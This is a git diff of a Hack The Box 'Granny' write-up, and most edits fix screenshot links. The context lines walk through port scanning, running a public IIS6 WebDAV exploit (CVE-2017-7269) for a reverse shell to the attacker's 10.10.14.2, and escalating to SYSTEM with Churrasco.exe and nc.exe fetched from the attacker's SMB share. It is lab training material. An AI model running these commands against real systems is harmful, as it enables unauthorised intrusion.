@@ -35,7 +35,7 @@ We begin by checking if the target is alive with ICMP:
 ping -c 1 10.10.10.15
 ```
 
-![[GitHub Documentation/EASY/HTB_Granny_Writeup/screenshots/ping.png]]
+![](screenshots/ping.png)
 
 The machine responds, confirming it is alive.
 
@@ -48,7 +48,7 @@ We scan all 65,535 TCP ports to identify open services:
 nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.15 -oG allPorts
 ```
 
-![[GitHub Documentation/EASY/HTB_Granny_Writeup/screenshots/allports.png]]
+![](screenshots/allports.png)
 
 Extract the open ports:
 
@@ -56,7 +56,7 @@ Extract the open ports:
 extractPorts allPorts
 ```
 
-![[GitHub Documentation/EASY/HTB_Granny_Writeup/screenshots/extractports.png]]
+![](screenshots/extractports.png)
 
 Only port **80/tcp** is open.
 
@@ -73,7 +73,7 @@ nmap -p80 -sC -sV 10.10.10.15 -oN targeted
 cat targeted -l java
 ```
 
-![[GitHub Documentation/EASY/HTB_Granny_Writeup/screenshots/targeted.png]]
+![](screenshots/targeted.png)
 
 **Findings:**
 
@@ -96,11 +96,11 @@ We clone the exploit:
 git clone https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269
 ```
 
-![[GitHub Documentation/EASY/HTB_Granny_Writeup/screenshots/exploit.png]]
+![](screenshots/exploit.png)
 
 This is a classic **buffer overflow** triggered via the **PROPFIND** WebDAV request:
 
-![](GitHub%20Documentation/EASY/HTB_Grandpa_Writeup/screenshots/exploit_propfind.png)
+![](screenshots/exploit_propfind.png)
 
 The exploit script requires:
 
@@ -115,7 +115,7 @@ We run the exploit and set up a listener with `nc`:
 python2 iis6\ reverse\ shell 10.10.10.15 80 10.10.14.2 443
 ```
 
-![[exploit_run.png]]
+![](screenshots/exploit_run.png)
 
 ✅ Reverse shell obtained.
 
@@ -128,11 +128,11 @@ We check our privileges and system structure:
 
 On Windows Server 2003, user profiles are located in **`Documents and Settings`** instead of `Users`:
 
-![[users.png]]
+![](screenshots/users.png)
 
 Checking privileges:
 
-![](GitHub%20Documentation/EASY/HTB_Grandpa_Writeup/screenshots/priv.png)
+![](screenshots/priv.png)
 
 We have **SeImpersonatePrivilege** enabled, which can be exploited for privilege escalation.
 
@@ -141,7 +141,7 @@ We have **SeImpersonatePrivilege** enabled, which can be exploited for privilege
 
 Normally, **JuicyPotato** would be used, but it does not support Windows Server 2003 due to missing CLSIDs. 
 
-![[GitHub Documentation/EASY/HTB_Granny_Writeup/screenshots/JP_clsid.png]]
+![](screenshots/JP_clsid.png)
 
 Instead, we use **Churrasco.exe**, a community version adapted for Windows Server 2003.
 
@@ -160,13 +160,13 @@ dir \\10.10.14.2\smbFolder\
 copy \\10.10.14.2\smbFolder\churrasco.exe churrasco.exe
 ```
 
-![[GitHub Documentation/EASY/HTB_Granny_Writeup/screenshots/upload_churrasco.png]]
+![](screenshots/upload_churrasco.png)
 
 Move to `Temp` directory if copying fails.  
 
 Running without arguments fails, so we must specify a command:
 
-![[execute churrasco.png]]
+![](screenshots/execute_churrasco.png)
 
 To get a more stable shell, we upload `nc.exe` via SMB and then execute it with Churrasco:
 
@@ -190,7 +190,7 @@ copy "\\10.10.14.2\smb\nc.exe" nc.exe
 
 With SYSTEM access, we can retrieve both flags:
 
-![[GitHub Documentation/EASY/HTB_Grandpa_Writeup/screenshots/root_user_flag.png]]
+![](screenshots/root_user_flag.png)
 
 ✅ **User flag obtained**  
 ✅ **Root flag obtained**
